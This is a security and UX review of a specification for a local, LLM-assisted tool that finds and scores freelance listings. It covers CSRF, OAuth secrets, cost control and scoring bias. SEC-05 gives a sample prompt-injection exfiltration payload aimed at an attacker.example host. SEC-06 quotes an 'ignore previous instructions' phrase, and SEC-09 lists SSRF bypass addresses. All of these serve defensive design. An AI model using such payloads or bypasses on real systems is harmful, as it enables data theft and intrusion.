# FOI Specification Review — Security & UX Recommendations

Oct 20, 2026 · @Mufaddal Ragib

## Summary

The specs are ready to implement after ten targeted changes, and none of them alters a CONFIRMED decision. Data rights, provenance and fail-closed behaviour are already strong. The gaps are the browser-facing auth boundary, the secret and OAuth lifecycle, how model output is rendered, and scoring rules that would spend the LLM budget on avoidable re-evaluations.

| # | Finding | Change | Why it can't wait |
| --- | --- | --- | --- |
| 1 | SPEC-01 | Correct test fixtures P5-01 and P5-02 | Both are arithmetically impossible under the §5.2 formula; an agent will bend the formula to pass them |
| 2 | SEC-01 | Exact-origin checks plus a custom-header CSRF guard | Every localhost port is the same site, so SameSite cookies don't separate FOI from JSI or any other local server |
| 3 | SEC-03 | Launch-token login; authenticate reads too | The spec never says how the operator authenticates, and GET routes are open |
| 4 | SEC-04 | SecretStore and a defined OAuth flow | Rotating refresh tokens have no permitted home: `.env` is static and `app_settings` forbids secrets |
| 5 | SEC-05 | Render model output as inert text | A prompt-injected Markdown image can leak profile data on page load, with no click |
| 6 | COST-01 | Separate aggregation policy from factor policy | A weight tweak currently stales every evaluation and triggers paid re-scoring |
| 7 | COST-02 | Hash listing content, not volatile signals | Proposal counts change on every re-search and would stale scores each time |
| 8 | COST-04 | Cap LLM quick-evaluations per run | Defaults allow 600 candidates per run against a $20 monthly LLM allocation |
| 9 | SCORE-01 | Fix the missing-factor ranking bias | Unknown competition outranks known heavy competition, favouring web-search leads |
| 10 | SPEC-02 | Simplify run status; allow cancel in paid stages | You cannot cancel during EVALUATING or ASSESSING, where the money is spent |

Severity scale used below: **Critical** = wrong behaviour as written; **High** = likely security exposure or budget loss; **Medium** = fix before the named phase gate; **Low** = quality improvement.

## What to keep unchanged

These design choices are better than most production systems; the recommendations below build on them.

- Fail-closed source policy checked before fetch, persistence or LLM disclosure (ADR-004).
- Explicit `unknown` and tri-state facts instead of optimistic defaults (ADR-008).
- Evaluations pinned to immutable studio-profile revisions (ADR-005).
- Money as integer minor units in decimal strings (ADR-006).
- `COMPLETE` vs `PARTIAL` semantics that never infer closure from a failed or capped fetch.
- Dedupe keys over the full work identity, and atomic budget reservations.
- Fixture-first testing, with live provider tests as separate, manual gates.

## Part A — Spec defects to fix before implementation

Nine defects would mislead an implementer, most of all an AI coding agent that treats tests as ground truth.

### SPEC-01 · Critical · Phase 5 fixtures contradict the scoring formula

**Where:** Architecture spec §11, Phase 5, tests P5-01 and P5-02.

**Problem:** With P = 0.60·C + 0.40·F, C 90 and F 65 give 80.0, as P4-07 and §7.4 already state — not 85. P5-02's "priority 90, feasibility 45" is impossible: the maximum priority with F = 45 is 78.0.

**Change:**

- P5-01 → C 95, F 70 (P = 85.0).
- P5-02 → C 100, F 55 (P = 82.0). It passes the priority and capability gates and fails F ≥ 60, which is the point of the test.
- Generate every numeric fixture with the reference aggregator inside a unit test. Never hand-write expected scores.

### SPEC-02 · High · Run state machine has unreachable cancels and wrong terminal states

**Where:** Architecture spec §4.1.

**Problems:**

- Cancel exits only CREATED, FETCHING and NORMALIZING — not SCREENING, EVALUATING or ASSESSING, where paid calls happen.
- There is no CANCELLING state, although cancellation is cooperative and takes time.
- SCREENING → COMPLETED and EVALUATING → COMPLETED ignore earlier source failures; those runs should end COMPLETED\_WITH\_ERRORS.
- No FAILED exit exists after NORMALIZING, e.g. for a storage error during evaluation.
- The text admits stages overlap, so a single linear stage value misreports progress.

**Change:** Run status becomes QUEUED → RUNNING → (CANCELLING) → COMPLETED, COMPLETED\_WITH\_ERRORS, FAILED or CANCELLED. Progress moves to per-stage counters: fetched, normalized, screened, scored, assessed, skipped. One pure function derives the terminal status from source and item outcomes, tested against a truth table.

### SPEC-03 · High · Tables the behaviour depends on are missing

**Where:** Architecture spec §2.2.

- `audit_events` — Settings promises "audit records" and invariant 6 stores operator overrides.
- `idempotency_keys` (key, request hash, resource id, expiry) — §4.3 replay semantics need it.
- `sessions` — if server-side sessions are used, as SEC-03 recommends.
- `skills` taxonomy with aliases — `canonical_skill_key` has no source. Matching "PowerBI", "Power BI" and "Microsoft Power BI" depends on it.
- `evaluation_feedback` — operator overrides (invariant 6) and calibration data (SCORE-04).
- `source_connections` — OAuth metadata such as granted scopes, expiry and last refresh. Tokens themselves live in the SecretStore.
- `operator_blocks` — the baseline §7.1 lists operator blocks as an eligibility check.

For active-job uniqueness, SQLite supports partial indexes: `CREATE UNIQUE INDEX ux_jobs_active ON background_jobs(dedupe_key) WHERE status IN ('queued','running');`

### SPEC-04 · Medium · ERD and table definitions disagree

- `PORTFOLIO_EVIDENCE.url` vs `source_url`; `SERVICES.keywords_json` vs `search_taxonomy_json`; `EVALUATIONS.policy_hash` vs `scoring_policy_hash`.
- The ERD's `SEARCH_RUNS` lacks `studio_revision_id`.
- `search_runs.policy_version` is ambiguous: source policy or scoring policy?

**Change:** Declare §2.2 authoritative and generate the ERD from the Drizzle schema in CI. Snapshot the studio revision and scoring policy hash on each run, and each source's policy version on `search_run_sources`.

### SPEC-05 · Medium · Eligibility states are ambiguous where it matters most

**Where:** Architecture spec §4.2 and §5.1; baseline §7.1.

**Problem:** §5.1 introduces `possible`, then folds it into `unknown`. §4.2 lists `NEEDS_INFO` beside `READY_TO_SCORE` without saying whether it is scored. `needs_information` also means two things: an eligibility status and an evaluation status. Budgets are often missing, so this decides whether many leads are ever scored.

**Change:**

- Check results: `pass | fail | partial | unknown`, where `partial` means the range straddles the floor.
- Eligibility: `eligible | ineligible | unverified`.
- Only `ineligible` stops scoring. `unverified` is scored and labelled. Keep `needs_information` for evaluations only.

### SPEC-06 · Medium · The reference aggregator has silent edge cases

**Where:** Architecture spec §5.4.

- It divides by zero if `minCoverage` is 0 and nothing is observed.
- Duplicate factor keys pass silently; `find` takes the first.
- A scored factor with no evidence is dropped without a trace.
- Unknown keys are ignored, and weight sums are not checked inside the function.

**Change:** Reject duplicate and unknown keys. Return `rejectedFactors` with reasons, for display. Guard `weightObserved === 0`. Assert each weight group sums to 1 within 1e-9.

### SPEC-07 · Medium · Endpoints are missing for features the specs require

| Feature | Required by | Proposed endpoint |
| --- | --- | --- |
| Manual URL or text capture | Baseline §5.1; spec §3.3 ManualConnector | `POST /opportunities/manual` |
| OAuth connect and callback | Spec §3.3 (Upwork, Freelancer) | `POST /sources/:id/connect`, `GET /sources/:id/oauth/callback` |
| Disconnect and purge tokens | Spec §9.2 policy revocation | `DELETE /sources/:id/connection` |
| Dismiss an item, block a client | Baseline §7.1 operator blocks | `POST /opportunities/:id/dismiss`, `POST /blocks` |
| Operator override or commentary | Spec §2.3 invariant 6 | `POST /evaluations/:id/feedback` |
| Excluded-items diagnostic view | Baseline §7.1; spec §5.1 | `GET /search-runs/:id/results?include=excluded` |
| Run cost estimate | Spec §8.1.1 preflight | `POST /search-runs/estimate` |
| Scoring what-if preview | COST-01 | `POST /settings/scoring/preview` |
| Bulk re-score with estimate | COST-03 | `POST /evaluations/rescore` (with `dryRun`) |
| Audit log | SEC-12 | `GET /audit-events` |

### SPEC-08 · Low · Currency exponents vary

ISO 4217 minor units are not always two decimals: JPY has 0; BHD, KWD and OMR have 3. Store an exponent table, reject unknown codes, and format with `Intl.NumberFormat`.

### SPEC-09 · Low · "Exactly two partners" is hard-coded

Keep D-002, but model partners as rows with an `active` flag. Enforce "exactly two active" in the application layer. Replacing a partner then becomes a data change, not a migration, and old evaluations keep their provenance.

## Part B — Security

The outbound side (SSRF, provider rights) is well specified. The inbound browser boundary, the secret lifecycle and model-output rendering are not.

### SEC-01 · High · Every localhost port is the same site

**Where:** Architecture spec §7.1, §9.1, ADR-010; tests P1-03 and P1-04.

**Problem:** Cookies are not isolated by port, and SameSite compares sites, not origins. A page on `http://localhost:5173` — a JSI dev server, a notebook, a compromised npm dev server — is same-site to FOI on port 4311. It can send cookie-bearing POSTs that pass `SameSite=Strict`, and can overwrite FOI cookies of the same name.

**Change:**

- Require an exact `Origin` match (scheme, host and port) on every non-GET request. Reject a missing or `null` Origin.
- Require a custom header on mutations, e.g. `X-FOI-Request: 1`. It forces a CORS preflight that FOI never approves; never send `Access-Control-Allow-*` headers.
- Use Fetch Metadata: on `/api`, accept only `Sec-Fetch-Site: same-origin`. That rejects both `cross-site` and the other-port `same-site` case.
- Pick one canonical host (`127.0.0.1:4311`) and redirect `localhost` to it. The two are separate cookie jars, and an exact `Host` allowlist blocks DNS rebinding.
- Give the session cookie an install-unique name with `HttpOnly; SameSite=Strict; Path=/api`.
- Hono ships `csrf` and `secureHeaders` middleware; verify their behaviour against the pinned version rather than assuming it.

### SEC-02 · High · Authenticate reads, not only mutations

**Where:** Architecture spec §7.1 ("authenticated mutation endpoints").

**Problem:** GET routes return partner profiles, notes, usage and source health. Same-origin policy usually hides them, but DNS rebinding, other-port pages and browser extensions make "reads are harmless" brittle.

**Change:** Every `/api/v1/*` route requires a session except `/health` and the launch-token exchange. `/setup/status` returns only a boolean.

### SEC-03 · High · Specify operator login: a one-time launch token

**Where:** Architecture spec §7.1 and `POST /auth/session` — the mechanism is never defined.

**Change:**

- `foi start` mints a single-use token (at least 128 bits, valid 2 minutes) and opens `http://127.0.0.1:4311/launch#t=<token>`.
- The page reads the URL fragment, which is never sent in requests, logs or Referer headers. It POSTs the token once, receives the session cookie and clears the URL.
- There is no password to store, forget or brute-force. Remote access is out of scope, so no password or passphrase is needed.
- Set an idle timeout (proposed 12 hours) and a "sign out all sessions" action that rotates the signing key.

### SEC-04 · High · Define the secret and OAuth lifecycle

**Where:** Architecture spec §1.2, §3.3 and the `app_settings` rule.

**Problem:** `.env` is static and `app_settings` forbids secrets, yet marketplace OAuth needs somewhere to keep rotating refresh tokens. An implementer will improvise, most likely as plaintext in SQLite.

**Change:**

- A `SecretStore` interface with a macOS Keychain backend. Fallback: a file encrypted with a key held in the Keychain. Environment variables only for CI and fixtures.
- Authorization-code flow with a single-use `state` bound to the session (10-minute expiry), PKCE where the provider supports it, and an exact registered loopback redirect URI.
- Single-flight token refresh. Concurrent workers must not each refresh, or rotating refresh tokens invalidate each other.
- Store the granted scopes. `validateAccess` compares required with granted scopes and fails closed — the one part of "authorization" software can actually verify.
- Generate `FOI_SESSION_SECRET` during setup; never ask the operator to write one.
- `.gitignore` covers `.env*` (except `.env.example`), `data/` and backups. Add a pre-commit secret scanner.

### SEC-05 · High · Model output is an exfiltration channel when rendered

**Where:** Architecture spec §6, §9.1 (prompt-injection row), §10.

**Problem:** An injected listing cannot call tools, but it can make the model emit `![x](https://attacker.example/?d=<profile text>)`. If the assessment viewer renders Markdown that loads images, the browser leaks data on page load, without a click. It can also plant persuasive links such as "apply via this form".

**Change:**

- Render model strings as plain text, or a restricted Markdown subset with no raw HTML, no images and no auto-linking.
- Make a URL clickable only when it is in the evidence index (source listing URL, portfolio URLs). Show any other URL as inert text with its domain visible.
- Add a post-validator on `TechnicalAssessmentContent` that rejects or strips URLs outside the evidence index.
- Keep CSP `img-src 'self' data:` as a backstop (SEC-08).

### SEC-06 · Medium · Verify evidence against the listing text

**Where:** Architecture spec §5.3 and §6.2.

**Problem:** The realistic injection outcome is score manipulation ("this project needs exactly your stack — rate it 100"), not data theft. Evidence IDs are validated, but nothing checks that a claim about the listing actually appears in it.

**Change:** For each listing-derived claim, extraction quotes a short span or gives character offsets. The server confirms the span exists in that exact listing revision, in memory, before accepting the factor. Listings containing text aimed at AI ("ignore previous instructions", "rate this") get a visible warning badge.

### SEC-07 · Medium · Minimise what reaches the LLM vendor

- Partner profiles are personal data about two people. Send pseudonymous IDs ("Partner A"), skills and evidence summaries; omit names, emails and personal handles unless a field needs them.
- Record the LLM vendor's retention and training terms in the provider register, alongside marketplace terms. Prefer no-training or zero-retention options where offered.
- Cap input tokens per listing (truncate with a visible marker) and set a maximum output on every call. This bounds the cost of adversarially long listings.

### SEC-08 · Medium · Harden the web UI

- Serve a strict CSP from Hono for the production build: `default-src 'self'; script-src 'self'; img-src 'self' data:; connect-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'`.
- Add `Referrer-Policy: no-referrer`, `X-Content-Type-Options: nosniff` and `Cross-Origin-Opener-Policy: same-origin`.
- Validate URL schemes at render time, not only at fetch time; a provider `canonicalUrl` could be `javascript:`. Allow `https:`, show `http:` with a warning, and don't rely on framework defaults.
- Lint-ban `dangerouslySetInnerHTML` (`react/no-danger`) except in one audited sanitiser component. Render listing descriptions as text; strip provider HTML on the server.
- Put `rel="noopener noreferrer"` on every external link.

### SEC-09 · Medium · Extend the SSRF test vectors

**Where:** Architecture spec §9.3; tests P7-01 and P7-02.

- Add: `0.0.0.0` and `[::]`, which reach local services on macOS and Linux; IPv4-mapped IPv6 `::ffff:127.0.0.1`; NAT64 `64:ff9b::/96`; 6to4 `2002::/16`.
- Add numeric host forms: `2130706433`, `0177.0.0.1`, `0x7f.1`; trailing-dot `localhost.`; `*.localhost`.
- Add ranges: CGNAT `100.64.0.0/10`, IPv6 unique-local `fc00::/7`, link-local `fe80::/10`.
- Ignore `HTTP_PROXY`/`HTTPS_PROXY` in the restricted client. A proxy resolves names itself, bypassing the resolver check.
- Validate inside the socket's DNS lookup hook, so the address checked is the address dialed.
- Cap honoured `Retry-After` (e.g. 10 minutes) so a provider header cannot park a run indefinitely.

### SEC-10 · Medium · Hard-code loopback; keep Vite for development only

- Remote access is out of scope (decided 20 Oct 2026). Bind to `127.0.0.1` in code and remove `FOI_BIND_HOST` from `.env.example` and configuration, so no setting can expose FOI on a network.
- Use the Vite dev server only for development: bound to localhost, restrictive `allowedHosts`, a patched version. Daily use runs the production build served by Hono.
- A future AWS deployment (spec §13) stays a separate project with its own TLS and authentication design.

### SEC-11 · Medium · Data lives in the project folder; Git gets text exports only

- Decided 20 Oct 2026: all FOI data lives inside the project folder under `data/`, so the folder is self-contained and shareable through the team's private GitHub repository.
- **Committed:** `data/shared/` holds readable text files for both partner profiles, skills, evidence, services, saved searches, settings and pipeline items (operator labels and notes). It also holds scores and technical assessments wherever the source permits storing derived results, with any provider text removed.
- FOI rewrites `data/shared/` whenever that data changes. A fresh clone plus `npm start` rebuilds the database from it.
- **Ignored by Git:** `data/foi.sqlite` with its WAL files (working database and listing cache), `data/backups/` and `data/logs/`. A pre-commit check blocks any `.sqlite` file, cache content, log or secret.
- **Full copies travel outside Git:** `npm run data:snapshot` writes one consistent, passphrase-encrypted file without the listing cache; `npm run data:restore <file>` rebuilds from it.
- Local files in `data/` get 0700 directory and 0600 file permissions. Warn when the project folder sits on a synced or network volume such as iCloud or Dropbox, which can corrupt a live SQLite database.
- Secrets never enter the folder: they stay in each person's Keychain, and each teammate connects their own accounts. Uninstalling FOI also removes its Keychain entries.
- Tests: an export → fresh-import round trip reproduces all team-owned data exactly; the pre-commit check rejects a staged `.sqlite` file.

### SEC-12 · Medium · Add an append-only audit log

- Record session start and end, source authorization and policy edits, credential connect and disconnect, budget and scoring changes, purges, exports and score overrides.
- Source authorization is an operator attestation (SEC-14), so this log is the real compliance record. Show it in Settings.

### SEC-13 · Medium · Treat the dependency tree as attack surface

The development machine holds marketplace and LLM keys, and the implementer is an AI agent that may add packages.

- Put a dependency allowlist in the spec; the agent asks before adding anything. This guards against hallucinated and typosquatted package names.
- Commit the lockfile, install with `npm ci` only, and set `ignore-scripts=true` in `.npmrc`. Rebuild native modules (the SQLite driver) in an explicit step.
- Pin exact versions. Let Renovate or Dependabot propose updates only after a cool-down of several days; recent self-propagating npm worms harvested tokens from developer machines within hours of publishing.
- Keep secrets in the Keychain rather than the shell environment, so a malicious install script cannot read them from `process.env`.
- Run `npm audit` or an OSV scan in CI.

### SEC-14 · Low · Call source authorization what it is: an attestation

Spec §7.2 says a checkbox must not override missing vendor permission, but software cannot verify a legal agreement. Split the two:

- **Enforced technical checks:** valid credentials, required scopes granted, hostnames allowlisted.
- **Operator attestation:** mandatory reference, date, permitted fields, cache TTL and LLM-sharing answer, with a review expiry (proposed 180 days).

### SEC-15 · Low · Logging and input limits

- Log through an allowlist of structured fields rather than redaction patterns. Never log listing bodies, prompts or model responses at info level; debug output goes to a separate, auto-purged file.
- Cap inputs on the server: keyword count and length, `maxPagesPerSource`, `maxResultsPerSource`, note length.

## Part C — Scoring, cost and staleness

As written, routine actions — tweaking a weight, re-running a search, fixing a typo in a profile — mark scores stale and invite paid re-evaluation. Four changes keep the $20 LLM allocation for new work, and two fix ranking quality.

### COST-01 · High · Split factor policy from aggregation policy

**Where:** `evaluations.scoring_policy_hash`, spec §2.3 invariant 2, test P4-09.

**Problem:** Any weight or threshold edit changes the policy hash and stales every evaluation. Factor scores are already stored, so re-aggregation is pure arithmetic.

**Change:**

- `factorPolicyVersion` covers prompt version, factor definitions and model. Changing it needs LLM work.
- `aggregationPolicy` covers weights, coverage minimums, gates and commercial floors. Changing it recomputes instantly, at no cost.
- This enables a live before/after ranking preview in Settings (UX-06).

### COST-02 · High · Hash listing content, not volatile signals

**Where:** `source_revision_hash`, invariant 2, test P4-10.

**Problem:** Proposal counts, last-activity times and client statistics change constantly. If they feed the revision hash, every re-search stales scores.

**Change:** `contentHash` = SHA-256 over RFC 8785 canonical JSON of title, description, skills, budget, engagement, deadline and location restrictions. Store volatile signals as timestamped observations that feed only deterministic factors such as competition. Only a `contentHash` change triggers LLM re-evaluation.

### COST-03 · High · Detect material profile changes

**Where:** Spec §2.3 invariants 1–2; tests P2-04 and P2-05.

**Problem:** Fixing a typo in a partner's notes creates a new studio revision and stales every evaluation.

**Change:** Hash only the scoring-relevant projection: skills, proficiency, evidence claims, services and hours. Compute the changed-skill set and stale only evaluations whose matched or missing requirements intersect it. Others show "profile updated — not affected", with a bulk re-score that quotes its cost first.

### COST-04 · High · Cap and stage LLM work per run

**Where:** Spec §7.3 example (5 pages, 200 results per source) and §8.1.2.

**Problem:** Three sources × 200 results = 600 candidate evaluations in one run. At an assumed 3,000 input and 500 output tokens each, that is 1.8 million input and 0.3 million output tokens per run. A few runs would consume a $20 monthly allocation at most model tiers.

**Change:**

- Add `maxQuickEvaluationsPerRun` (proposed 40–60). A deterministic pre-rank — skill-alias overlap, budget check, recency — picks which candidates the LLM sees. The rest show "Not evaluated" with a per-item cost estimate and an Evaluate button.
- Put the static studio profile and instructions first in every prompt and use the provider's prompt caching. The cost model must know cached-token rates.
- Reuse evaluations across runs, keyed by `contentHash`, material profile hash and `factorPolicyVersion`. A listing seen before then costs nothing.

### COST-05 · Medium · Show the cost before the run starts

`POST /search-runs/estimate` returns a minimum–maximum range for search and LLM spend, plus the remaining budget. The Start button shows it, for example "Est. $0.20–$0.90 · $14.30 left this month", and asks for confirmation above a configurable amount.

### SCORE-01 · High · Missing factors currently outrank known weaknesses

**Where:** Spec §5.2, "Computation and coverage"; baseline §7.2.

**Problem:** Renormalising over observed factors gives a listing with unknown competition a feasibility score from its other factors only. A listing with known heavy competition is penalised. Competition is 30% of F and the factor most often missing — web-search leads never have it — so web-search leads systematically outrank marketplace leads.

**Worked example:** two listings with economics, capacity, scope and client credibility all at 80.

| Listing | Competition | F as specified | Coverage | F with conservative sort (prior 40) |
| --- | --- | --- | --- | --- |
| A (web search) | unknown | 80.0 | 0.70 | 68.0, band 56–86 |
| B (marketplace) | 40 | 68.0 | 1.00 | 68.0 |

A ranks 12 points above B purely because less is known about it.

**Change (needs an ADR; no fabricated data):**

- Store and display a band per dimension: the lower bound treats missing factors as 0, the upper as 100.
- Sort by a conservative point: the observed weighted sum plus missing weight × `missingFactorPrior` (proposed 40). It is a labelled ranking policy applied by deterministic code, never stored or shown as evidence.
- This sits alongside the spec's rule that a model must not assign neutral values; record the distinction in the ADR.

### SCORE-02 · Medium · The auto-assessment gate ignores coverage

**Where:** Spec §5.6 `qualifies`.

The gate checks scores but not coverage or the provisional flag. Listing A above could qualify on a provisional F of 80. Add `capability.coverage` and `feasibility.coverage` ≥ `autoAssessmentMinCoverage` (proposed 0.8) and `confidence !== 'low'`.

### SCORE-03 · Medium · Use posting age inside the competition factor

Posting age is objective and nearly always available. On marketplaces, early responses tend to get more attention, and old listings with no activity are often already filled.

- Add a recency sub-signal inside the competition factor, keeping D-015's weights unchanged.
- Add posting age as a sort and filter.
- Label listings past a configurable age with no recent activity "possibly filled". It is a label, never a closure.

### SCORE-04 · Low · Capture judgments so calibration has data

Spec §14.1 expects weights and gates to be revisited after real results, but nothing records the operator's judgments.

- Dismiss with a reason code: budget too low, wrong skills, too competitive, suspected scam, not interesting.
- Record shortlist decisions and outcomes.
- A calibration view compares priority distributions for shortlisted and dismissed items and names the factor that disagrees most. Plain tables, no machine learning — consistent with the non-goals.

## Part D — User experience

The specs define correct states but not how they feel in daily use. The biggest wins are a one-command start, a calmer feed row, and cost and staleness shown where decisions are made.

### UX-01 · High · One command to the first result

**Today:** install, migrate, run a CLI setup, write secrets into `.env`, start server and worker, find the URL, log in.

**Proposed:**

1. `npm start` runs migrations, creates secrets in the Keychain on first run, starts API and worker, and opens the browser via the launch token (SEC-03).
2. First run lands on a wizard: name Partners A and B → add skills → set the monthly cap → connect sources with a checklist → run a demo search.
3. Skill entry can optionally take pasted CV text and draft a skill list. The operator confirms every line; nothing is saved as evidence unconfirmed.

Consider running the worker inside the API process for the MVP: one thing to start, one SQLite writer, simpler crash recovery. Keep the module boundary so it can split later (ADR).

### UX-02 · High · Make demo mode unmistakable

`.env.example` defaults to `FOI_FIXTURE_MODE=true`, but no UI rule makes fixtures look different from real listings.

- Show a persistent banner: "Demo data — not real opportunities".
- Give fixture sources a distinct badge.
- Add an `is_fixture` flag that excludes demo rows from pipeline, usage and calibration.
- Offer one-click "Clear demo data".

### UX-03 · High · Calm the feed row

**Where:** Spec §10.2 requires eight items in every row, plus provisional and stale labels. In a centre column of roughly 500 px this becomes a wall of badges.

**Proposed row:**

1. Title.
2. Source · engagement · budget or "budget not disclosed" · posted age.
3. One priority badge whose style encodes confidence: solid for full coverage, outlined for provisional, hatched for stale — with a text label, never colour alone.
4. Two thin labelled bars for Capability and Feasibility.
5. One plain-language reason built from the top factors, e.g. "Strong match: Power BI, AWS · 10–15 proposals · budget fits".

Eligibility appears in the row only when it is not "eligible". "Last observed" sits in the detail panel and tooltip. Build the reason line from factor data with a template, not model prose, so injected text cannot reach the feed.

### UX-04 · Medium · Fast triage

- Keyboard shortcuts: `j`/`k` move, `s` shortlist, `x` dismiss with a reason picker, `a` request assessment, `o` open source.
- "New since last run" markers, seen/unseen state, hide dismissed, and bulk actions.
- Saved views, e.g. "Fixed-price · priority ≥ 70 · unseen".

### UX-05 · Medium · A run the operator can follow

- A persistent header chip for the active run, with per-stage counters and a Cancel button that shows "Stopping…" while CANCELLING.
- A preflight before Start: each selected source shows Ready, Needs reconnect, Blocked or Over budget. Blocked sources are rejected with reasons (422) instead of producing a run that fails.
- While a run is active, disable Start and link to that run, instead of surfacing a 409 error.
- An optional browser notification when a run finishes. It only notifies and never starts work, so the manual-only rule holds.
- Results show "N new · M seen before".

### UX-06 · Medium · Explain staleness and offer the fix inline

- Name the cause: "Profile changed", "Listing changed" or "Scoring changed".
- Offer "Re-score" with its estimated cost inline, plus a bulk version scoped to affected items (COST-03).
- Apply weight changes immediately, with a before/after ranking preview (COST-01).

### UX-07 · Medium · Keep the budget in view

- A header meter showing month-to-date spend against the cap, with warnings at 50%, 80% and 100%.
- Per-run cost in the run history.
- After budget exhaustion, list exactly what was skipped and why. "Evaluate anyway" requires raising the cap explicitly.

### UX-08 · Medium · Source health as actionable cards

- Each source card shows a state (Connected, Needs attention, Blocked, Not configured) and a human reason, e.g. "Token expired 2 days ago".
- One primary action per card: Reconnect, Complete checklist, or Test connection with its cost shown.
- Show the policy review expiry date (SEC-14).
- Map error codes to remediation text; keep raw codes inside a details disclosure.

### UX-09 · Medium · Keep shortlisted items legible after cache expiry

`opportunities` deliberately holds no provider text, so a pipeline card loses its title when the cache expires.

- On shortlist, ask for an operator-written label, pre-filled only when the source policy permits storing the title.
- Expired cards say "Source content expired — open on \<source>".

### UX-10 · Medium · Assessments are read by two people

D-019 says work represents both partners, but only one operator uses FOI.

- Export an assessment to Markdown or PDF: operator-owned content only, provider text omitted unless permitted.
- Add "Copy clarification questions" for drafting proposals by hand.
- Add a "Reviewed by Partner A / Partner B" pair of checkboxes on pipeline items.

### UX-11 · Low · Show the studio's skill gaps

Aggregate missing skills and credentials across listings with good feasibility but low capability, e.g. "Top gaps, last 30 days: dbt (14 listings), Airflow (9)". The data already exists, so this costs nothing. It tells the partners which evidence to add or what to learn next.

### UX-12 · Low · Better profile editing

- A completeness indicator per partner, with inline evidence-gap warnings (P2-07 already detects them).
- Skill autocomplete from the alias taxonomy (SPEC-03).
- "Used in N current evaluations" shown before a skill is deleted.
- Soft delete with Undo instead of confirmation dialogs.

### UX-13 · Low · Scam and off-platform warnings

Deterministic patterns — requests to move to Telegram or WhatsApp, upfront fees, payment outside the platform — plus SEC-06's AI-instruction flags produce a non-blocking "Possible scam" label. Freelance marketplaces see these regularly, and the check needs no LLM.

### UX-14 · Low · Accessibility and locale

- Never encode meaning in colour alone; scores carry text and shape.
- Show times in the local time zone with absolute timestamps on hover; format currency with `Intl`.
- Keep a logical focus order across the three columns and respect `prefers-reduced-motion`.

## Part E — Process and spec hygiene

Most drift risk comes from the same facts living in several places. Make code the single source and have the specs point to it.

### PROC-01 · Generate contracts from one schema

Write Zod schemas once and derive TypeScript types, request validation, OpenAPI (e.g. Hono's Zod-OpenAPI integration) and a typed React client from them. Generate the ERD from the Drizzle schema in CI. This prevents SPEC-04-style drift.

### PROC-02 · One home for numeric defaults

Weights, thresholds and caps appear in both documents and will appear in tests. Put them in one seed file such as `config/defaults.ts`. The docs cite it, tests import it, and fixtures are computed from it (SPEC-01).

### PROC-03 · Move security gates earlier

Phase 7 holds most security tests, but the assessment viewer ships in Phase 5 and the full UI in Phase 6.

| Phase gate | Findings it must include |
| --- | --- |
| Phase 1 | SEC-01, SEC-02, SEC-03, SEC-10, SEC-11, SEC-13 |
| Phase 3 | SEC-04, SEC-09, SEC-14, SPEC-02 |
| Phase 4 | COST-01, COST-02, COST-03, SCORE-01 |
| Phase 5 | SEC-05, SEC-06, SEC-07, COST-04, SCORE-02 |
| Phase 6 | SEC-08, UX-02, UX-03 |

### PROC-04 · Rules for the AI implementer

Add these to spec §14:

- Never change a test's expected value to make it pass; report the conflict instead.
- Ask before adding a dependency (SEC-13).
- Write an ADR before any deviation from the spec, not after.
- Run the full suite before declaring a phase gate met, and label anything verified only against fixtures.
- Never put real credentials, listings or partner data into prompts, fixtures or commits.

### PROC-05 · Add a SECURITY.md

A one-page threat model: assets (partner data, credentials, budget), trust boundaries (browser ↔ API, API ↔ providers, API ↔ LLM vendor), and where findings are recorded.

## Proposed new acceptance tests

These 26 tests extend the existing phase tables; IDs continue each phase's numbering.

| Test | Given / When | Required result | Finding |
| --- | --- | --- | --- |
| P1-08 | POST from origin `http://localhost:5173` carrying a valid FOI cookie | Rejected; no side effect | SEC-01 |
| P1-09 | `GET /api/v1/partners` without a session | 401 | SEC-02 |
| P1-10 | Launch token reused, or used after 2 minutes | Rejected | SEC-03 |
| P1-11 | A config file or environment variable sets a non-loopback bind address | Ignored and logged; server listens on 127.0.0.1 only | SEC-10 |
| P1-12 | Data path inside a synced or network folder | Setup warns before creating the database | SEC-11 |
| P2-08 | Edit only a partner's free-text notes | Material profile hash unchanged; no evaluation stale | COST-03 |
| P3-13 | OAuth callback with a wrong or reused `state` | Rejected; no token exchange | SEC-04 |
| P3-14 | Two workers need a token refresh at the same moment | Exactly one refresh request | SEC-04 |
| P3-15 | Granted scopes lack a required scope | Source BLOCKED before any search request | SEC-04, SEC-14 |
| P3-16 | `POST /search-runs` selects a blocked source | 422 with reasons; no run created | UX-05 |
| P3-17 | Terminal status over every source/item outcome combination | Matches the truth table exactly | SPEC-02 |
| P3-18 | Cancel during EVALUATING | Status CANCELLING, then CANCELLED; no new paid calls after the flag | SPEC-02 |
| P4-14 | Change capability weights | Priorities recomputed; zero LLM calls; no stale flags | COST-01 |
| P4-15 | Re-search where only the proposal count changed | Competition factor recomputed; LLM evaluation reused | COST-02 |
| P4-16 | Listings A and B from SCORE-01 | A does not outrank B in the default sort; A shows a band | SCORE-01 |
| P4-17 | Model output with a duplicate or unknown factor key | Evaluation rejected with a reason | SPEC-06 |
| P5-12 | Model output contains a Markdown image and an external link | No image request leaves the browser; link rendered inert | SEC-05 |
| P5-13 | Quoted evidence span absent from the listing text | Factor rejected | SEC-06 |
| P5-14 | 600 candidates with a per-run cap of 50 | Exactly 50 LLM evaluations; the rest marked not evaluated | COST-04 |
| P5-15 | Provisional feasibility (coverage 0.70) with high scores | Not auto-assessed | SCORE-02 |
| P6-10 | Fixture mode on | Banner shown; fixture rows excluded from pipeline and usage | UX-02 |
| P6-11 | Shortlist an item whose title is not persistable; cache expires | Card shows the operator label and an expiry note | UX-09 |
| P7-12 | Every SSRF vector listed in SEC-09 | Refused at dial time | SEC-09 |
| P7-13 | `HTTPS_PROXY` set in the environment | Restricted client ignores it | SEC-09 |
| P7-14 | Clean install with `ignore-scripts` and the committed lockfile | `npm ci` succeeds; native rebuild is an explicit step | SEC-13 |
| P7-15 | Provider `canonicalUrl` is `javascript:` | Rendered as inert text | SEC-08 |

## Proposed v1.1.0 change log

Everything fits in architecture spec v1.1.0 as twelve new ADRs. The baseline needs clarifying references only, because no CONFIRMED decision changes.

| ADR | Decision | Findings |
| --- | --- | --- |
| ADR-011 | Loopback-only bind and request-integrity policy: exact Origin and Host, custom header, Fetch Metadata, authenticated reads | SEC-01, SEC-02 |
| ADR-012 | Launch-token authentication and session model | SEC-03 |
| ADR-013 | SecretStore (Keychain) and OAuth lifecycle | SEC-04 |
| ADR-014 | Model-output rendering rules and evidence-span verification | SEC-05, SEC-06 |
